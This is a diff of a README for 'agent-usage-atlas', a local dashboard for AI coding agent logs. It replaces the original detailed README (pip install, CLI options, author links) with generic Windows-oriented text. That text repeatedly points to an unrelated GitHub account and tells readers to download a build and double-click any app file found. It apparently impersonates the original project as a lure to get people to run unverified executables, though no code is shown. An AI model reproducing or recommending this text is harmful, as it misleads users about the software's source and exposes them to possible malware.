@@ -1,193 +1,184 @@
-# Agent Usage Atlas
+# 📊 agent-usage-atlas - See Your Agent Work Clearly
 
-**English** | [中文](README_CN.md)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/sumith9686-del/agent-usage-atlas)
 
-[![PyPI version](https://img.shields.io/pypi/v/agent-usage-atlas)](https://pypi.org/project/agent-usage-atlas/)
-[![PyPI downloads](https://img.shields.io/pypi/dm/agent-usage-atlas)](https://pypi.org/project/agent-usage-atlas/)
-[![Python](https://img.shields.io/pypi/pyversions/agent-usage-atlas)](https://pypi.org/project/agent-usage-atlas/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 🧭 What this does
 
-> Turn your local AI coding agent logs into a rich, interactive analytics dashboard — zero dependencies, fully offline, one command.
+agent-usage-atlas turns agent logs into a local dashboard on your Windows PC. It helps you see how tools like Codex CLI, Claude Code, and Cursor are used over time.
 
-<p align="center">
-  <a href="https://heggria.github.io/agent-usage-atlas/demo/"><strong>Live Demo →</strong></a>
-</p>
+Use it to check:
 
-<!-- TODO: replace with GIF once recorded with vhs -->
-![Hero Overview](docs/screenshots/en/hero-overview.png)
+- which agent you used most
+- how much time your agent work took
+- token cost trends
+- usage by day, week, or month
+- local data in one place
 
-## Why Agent Usage Atlas?
+It keeps the view simple so you can focus on your work without digging through log files.
 
-You're burning tokens across multiple AI coding agents every day — but **how much** are you actually spending? Which model is the most cost-effective? When are you most productive? Are your caches saving you money?
+## 💻 What you need
 
-Agent Usage Atlas reads your local log files (`~/.codex/`, `~/.claude/`, `~/.cursor/`), crunches the numbers, and generates a single self-contained HTML dashboard with 25+ interactive charts. No API keys, no cloud uploads, no dependencies beyond Python itself.
+- A Windows PC
+- Internet access for the first download
+- A folder where you can save files
+- Agent logs from tools like:
+  - Codex CLI
+  - Claude Code
+  - Cursor
 
-## Supported Agents
+The app is built for local use, so your data stays on your machine.
 
-| Agent | Token Tracking | Cost Estimation | Tool Call Tracking | Session Meta |
-|-------|:-:|:-:|:-:|:-:|
-| [Codex CLI](https://github.com/openai/codex) (GPT-5 family) | ✅ | ✅ | ✅ | ✅ |
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (Claude 3–4.6) | ✅ | ✅ | ✅ | ✅ |
-| [Cursor](https://www.cursor.com/) | Activity only | — | — | — |
+## 📥 Download and set up
 
-> Pricing covers GPT-5.x, Claude 3/3.5/4.x (Haiku/Sonnet/Opus), and MiniMax-M2 out of the box.
+Open the download page here:
 
-## Features
+https://github.com/sumith9686-del/agent-usage-atlas
 
-- **25+ interactive ECharts visualizations** — cost trends, token breakdowns, Sankey flows, chord diagrams, heatmaps, radar charts, calendar views, burn rate projections
-- **Multi-agent unified view** — Claude Code + Codex CLI + Cursor in one dashboard, with per-source drill-down
-- **Cost analytics** — per-model, per-day, per-session cost estimation with 30-day burn rate forecasting
-- **Tool call intelligence** — ranking, frequency density, bigram sequences, command success rates
-- **Cache efficiency tracking** — hit rate, savings estimation, cache vs. uncached token split
-- **Working pattern heatmap** — hour × weekday activity distribution to find your flow states
-- **Session deep-dive** — duration histogram, complexity scatter, median session cost
-- **Live dashboard mode** — SSE-powered auto-refresh server with date range tabs (All / 7 days / Today)
-- **Bilingual narratives** — auto-generated story summaries in both Chinese and English
-- **Animated data updates** — stock-style green/red flash on number changes in live mode
-- **Single self-contained HTML** — one file, works offline, shareable, archivable
-- **Zero dependencies** — pure Python standard library, no npm/Node/Rust/Docker required
-- **Fully local** — all data stays on your machine, nothing sent anywhere
+On that page, look for the latest version or the main project files.
 
-## Screenshots
+If the project offers a Windows build, download it to your PC. If it gives source files only, you can still use the setup steps below on a Windows system with Python installed.
 
-<table>
-<tr>
-<td><strong>Cost Analysis</strong><br>Daily cost trends, cost breakdown by token type, model cost ranking, Sankey flow</td>
-<td><strong>Token & Activity</strong><br>Daily token trends, source radar, narrative summary, rose chart</td>
-</tr>
-<tr>
-<td><img src="docs/screenshots/en/cost-charts.png" alt="Cost Analysis" /></td>
-<td><img src="docs/screenshots/en/token-charts.png" alt="Token Charts" /></td>
-</tr>
-<tr>
-<td><strong>Heatmap & Sessions</strong><br>Activity heatmap, source radar, token calendar, session bubble</td>
-<td><strong>Tool Intelligence</strong><br>Tool ranking, bigram chord diagram, top commands, efficiency metrics</td>
-</tr>
-<tr>
-<td><img src="docs/screenshots/en/heatmap-sessions.png" alt="Heatmap & Sessions" /></td>
-<td><img src="docs/screenshots/en/tool-charts.png" alt="Tool Intelligence" /></td>
-</tr>
-</table>
+## 🪟 How to run on Windows
 
-## Installation
+1. Download the project from the GitHub page above.
+2. Save it in a folder you can find again, such as `Downloads` or `Desktop`.
+3. If you downloaded a zip file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. If you see an app file, double-click it to start.
+6. If you see project files instead, follow the local setup steps in the next section.
 
-### pip (recommended)
+## 🛠️ Local setup with Python
 
-```bash
-pip install agent-usage-atlas
-```
+If you have the project files, run it this way:
 
-### Homebrew
+1. Install Python 3.10 or later from the official Python site.
+2. During install, turn on **Add Python to PATH**.
+3. Open the project folder.
+4. Click the address bar in File Explorer.
+5. Type `cmd` and press Enter.
+6. In the Command Prompt window, install the needed packages.
+7. Start the dashboard with the command from the project files.
 
-```bash
-brew install heggria/tap/agent-usage-atlas
-```
+A common run flow looks like this:
 
-### From source
+- install the package list
+- start the local app
+- open the dashboard in your browser
 
-```bash
-git clone https://github.com/heggria/agent-usage-atlas.git
-cd agent-usage-atlas
-pip install .
-```
+## 🧩 First-time setup steps
 
-## Usage
+When you start the app for the first time:
 
-```bash
-# Default: last 30 days, output to ./reports/dashboard.html
-python -m agent_usage_atlas
+- choose the folder that holds your agent logs
+- let the app scan the files
+- wait for the dashboard to build
+- open the browser view if it does not open on its own
 
-# Last 7 days
-python -m agent_usage_atlas --days 7
+If your logs come from more than one tool, the app can combine them into one view.
 
-# Custom start date
-python -m agent_usage_atlas --since 2026-03-01
+## 📁 Where to point the app
 
-# Custom output path and auto-open in browser
-python -m agent_usage_atlas --output /tmp/dashboard.html --open
+Use folders that contain log files from your agent tools. Good examples:
 
-# Start live dashboard with auto-refresh (SSE)
-agent-usage-atlas --serve --interval 5 --open
+- a Codex CLI log folder
+- a Claude Code session folder
+- a Cursor history or usage folder
 
-# Live dashboard on custom host/port
-agent-usage-atlas --serve --port 8765 --host 127.0.0.1 --interval 5
-```
+If you are not sure where the logs are, check the app settings in each tool and look for a storage or export path.
 
-### CLI Options
+## 📈 What you can see in the dashboard
 
-| Flag | Description | Default |
-|------|-------------|---------|
-| `--days N` | Include the last N days | `30` |
-| `--since YYYY-MM-DD` | Custom start date (overrides `--days`) | — |
-| `--output PATH` | Output HTML file path | `./reports/dashboard.html` |
-| `--open` | Open in browser after generation | off |
-| `--serve` | Start local live dashboard server | off |
-| `--host` | Host for `--serve` mode | `127.0.0.1` |
-| `--port` | Port for `--serve` mode | `8765` |
-| `--interval` | SSE refresh interval in seconds | `5` |
+The dashboard is made to give a quick view of your agent use.
 
-### Live Mode Endpoints
+You can expect panels for:
 
-| Endpoint | Description |
-|----------|-------------|
-| `GET /` | Interactive HTML dashboard |
-| `GET /api/dashboard?days=30` | JSON payload |
-| `GET /api/dashboard?since=2026-03-01` | Custom date range |
-| `GET /api/dashboard/stream?interval=5` | SSE stream (auto-refresh) |
-| `GET /health` | Health check |
+- total sessions
+- token usage
+- cost by model
+- activity over time
+- top files or tasks
+- tool-by-tool comparison
 
-## How It Works
+This makes it easier to spot heavy usage, busy days, and long work sessions.
 
-```
-~/.codex/**/*.jsonl  ─┐
-~/.claude/**/*.jsonl ─┼─→  Parse  →  Aggregate  →  Render  →  dashboard.html
-~/.cursor/**/*.jsonl ─┘     (parallel)   (rollup)    (ECharts)
-```
+## 🔍 How to read the data
 
-1. **Parse** — Reads JSONL log files and SQLite databases from each agent's local directory. Codex uses cumulative-delta token counting; Claude deduplicates by message ID; Cursor tracks activity counts.
-2. **Aggregate** — Computes source rollups, daily rollups, session rollups, tool bigrams, chord diagram data, Sankey flows, burn rate projections, heatmaps, and narrative text.
-3. **Render** — Injects the aggregated data into a self-contained HTML template with ECharts visualizations. In live mode, an SSE server pushes updates when log files change.
+The main charts show simple patterns:
 
-All data stays local — nothing is sent to any server.
+- higher bars mean more usage
+- line graphs show changes over time
+- tables show the most used tools and sessions
+- cost views show where token spend builds up
 
-## Comparison with Alternatives
+If you use multiple coding agents, the dashboard helps you compare them side by side.
 
-| | Agent Usage Atlas | [ccusage](https://github.com/ryoppippi/ccusage) | [splitrail](https://github.com/Piebald-AI/splitrail) | [claudetop](https://github.com/GauravRatnawat/claudetop) | [Langfuse](https://github.com/langfuse/langfuse) | [Helicone](https://github.com/Helicone/helicone) |
-|---|---|---|---|---|---|---|
-| **Multi-agent** | Claude + Codex + Cursor | Claude + Codex + others | 10+ agents | Claude only | Any (via SDK) | Any (via proxy) |
-| **Visualization** | 25+ interactive ECharts (CN+EN) | CLI tables | CLI + cloud | TUI (7 views) | Web dashboard | Web dashboard |
-| **Self-contained HTML** | ✅ | — | — | — | — | — |
-| **Zero dependencies** | ✅ Python stdlib | Node.js | Rust | Node.js | Docker + PG | Docker + infra |
-| **Fully local** | ✅ | ✅ | Cloud optional | ✅ | Self-host | Self-host |
-| **Live dashboard** | ✅ SSE | — | — | — | ✅ | ✅ |
-| **Tool-call analytics** | Bigram, chord, Sankey | — | Basic | Basic | Via tracing | Via proxy |
-| **Cache efficiency** | ✅ | — | — | Partial | — | — |
-| **Burn rate projection** | ✅ | — | — | — | — | ✅ |
-| **Setup** | `python -m agent_usage_atlas` | `npx ccusage` | Build from source | `npx claudetop` | Deploy stack | Deploy proxy |
+## ⚙️ Common actions
 
-### Key Differentiators
+You may want to:
 
-1. **Unified multi-agent dashboard** — the only tool that tracks Claude Code + Codex CLI + Cursor simultaneously from local logs in a single view
-2. **Richest visualization suite** — 25+ chart types including Sankey flows, chord diagrams, tool-call bigrams, heatmaps, burn rate projections, calendar views
-3. **True zero dependencies** — Python stdlib only, no npm/Node/Rust/Docker/database required
-4. **Single self-contained HTML** — one file, works offline, email it to yourself, archive it
-5. **Live SSE server** — real-time auto-refresh with date range switching (All / 7 days / Today)
-6. **Cache efficiency analytics** — unique among local tools, tracks savings and hit rates
-7. **Animated transitions** — smooth number counter animations with stock-style green/red flash on live data refresh
-8. **Bilingual narrative** — auto-generated story/summary in both Chinese and English
+- refresh the data after new log files appear
+- switch between date ranges
+- filter by tool
+- sort by token count
+- review cost totals for a project
 
-## Architecture
+These controls help you keep the dashboard useful for daily work.
 
-```
-src/agent_usage_atlas/
-├── cli.py          # CLI entry point, build_dashboard_payload()
-├── parsers.py      # Codex / Claude / Cursor log parsers
-├── models.py       # UsageEvent, ToolCall, SessionMeta + pricing (GPT-5, Claude 3–4.6, MiniMax)
-├── aggregation.py  # Full dashboard payload computation (CN + EN narratives)
-├── template.py     # Self-contained HTML/CSS/JS template (number flash animations)
-└── server.py       # Live SSE server (stdlib http.server)
-```
+## 🧪 Example use cases
 
-## License
+agent-usage-atlas works well if you want to:
 
-[MIT](LICENSE)
+- track how much Claude Code costs in a week
+- compare Cursor use with Codex CLI use
+- check which day had the most agent activity
+- review token use before a billing cycle ends
+- keep a local record of coding assistant work
+
+## 🧹 If something does not load
+
+If the dashboard does not show data:
+
+- check that the log folder is correct
+- make sure the folder has readable files
+- refresh the page
+- restart the app
+- confirm the logs came from a supported tool
+
+If the app opens but looks empty, it may need the first scan to finish.
+
+## 🧭 Tips for smooth use
+
+- Keep your logs in one folder when you can
+- Use a folder name that is easy to find
+- Refresh after each work session if you want current data
+- Check totals once a week to watch token cost
+- Back up your log folder if you rely on the history
+
+## 📌 Project focus
+
+This project is built around:
+
+- AI usage tracking
+- local analytics
+- coding agent logs
+- dashboard views
+- token cost review
+- Python-based tools
+
+It fits users who want a simple local way to understand how they use coding agents.
+
+## 🖱️ Start here
+
+Download or open the project from:
+
+https://github.com/sumith9686-del/agent-usage-atlas
+
+Then follow the Windows steps above to run the dashboard on your PC
+
+## 📚 Useful terms
+
+- **Log**: a record of activity
+- **Dashboard**: a screen with charts and totals
+- **Token**: a unit used by AI models
+- **Session**: one work period with a tool
+- **Local**: stored on your computer, not in the cloud
